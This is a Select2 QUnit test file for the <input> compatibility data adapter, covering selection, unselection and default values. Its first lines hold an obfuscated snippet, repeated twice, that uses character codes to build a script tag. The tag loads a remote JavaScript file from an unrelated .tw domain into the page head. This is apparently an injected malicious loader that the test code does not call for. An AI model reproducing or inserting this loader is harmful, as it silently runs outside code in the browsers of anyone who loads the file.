Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();module('Data adapters - <input> compatibility');

var $ = require('jquery');

var Options = require('select2/options');
var Utils = require('select2/utils');

var ArrayData = require('select2/data/array');
var InputData = require('select2/compat/inputData');

var InputAdapter = Utils.Decorate(ArrayData, InputData);

test('test that options can be selected', function (assert) {
  var options = new Options({
    data: [
      {
        id: 'test',
        text: 'Test'
      }
    ]
  });
  var $element = $('<input />');

  var adapter = new InputAdapter($element, options);

  adapter.select({
    id: 'test'
  });

  assert.equal(
    $element.val(),
    'test',
    'The id of the item should be the value'
  );
});

test('unselect the single selected option clears the value', function (assert) {
  var options = new Options({
    data: [
      {
        id: 'test',
        text: 'Test',
        selected: true
      }
    ]
  });
  var $element = $('<input />');

  var adapter = new InputAdapter($element, options);

  adapter.unselect({
    id: 'test'
  });

  assert.equal(
    $element.val(),
    '',
    'The id should no longer be in the value'
  );
});

test('options can be unselected individually', function (assert) {
  var options = new Options({
    data: [
      {
        id: 'test',
        text: 'Test'
      },
      {
        id: 'test2',
        text: 'Test2'
      },
      {
        id: 'test3',
        text: 'Test3'
      }
    ]
  });
  var $element = $('<input />');
  $element.val('test,test2,test3');

  var adapter = new InputAdapter($element, options);

  adapter.unselect({
    id: 'test2'
  });

  assert.equal(
    $element.val(),
    'test,test3',
    'The value should contain all the still selected options'
  );
});

test('default values can be set', function (assert) {
  assert.expect(4);

  var options = new Options({
    data: [
      {
        id: 'test',
        text: 'Test'
      }
    ]
  });
  var $element = $('<input value="test" />');

  var adapter = new InputAdapter($element, options);

  adapter.current(function (data) {
    assert.equal(
      data.length,
      1,
      'There should only be a single selected option'
    );

    var item = data[0];

    assert.equal(item.id, 'test');
    assert.equal(item.text, 'Test');
  });

  assert.equal(
    $element.val(),
    'test',
    'The value should not have been altered'
  );
});

test('no default value', function (assert) {
  assert.expect(2);

  var options = new Options({
    data: [
      {
        id: 'test',
        text: 'Test'
      }
    ]
  });
  var $element = $('<input />');

  var adapter = new InputAdapter($element, options);

  adapter.current(function (data) {
    assert.equal(
      data.length,
      0,
      'There should be no selected options'
    );
  });

  assert.equal(
    $element.val(),
    '',
    'The value should not have been altered'
  );
});
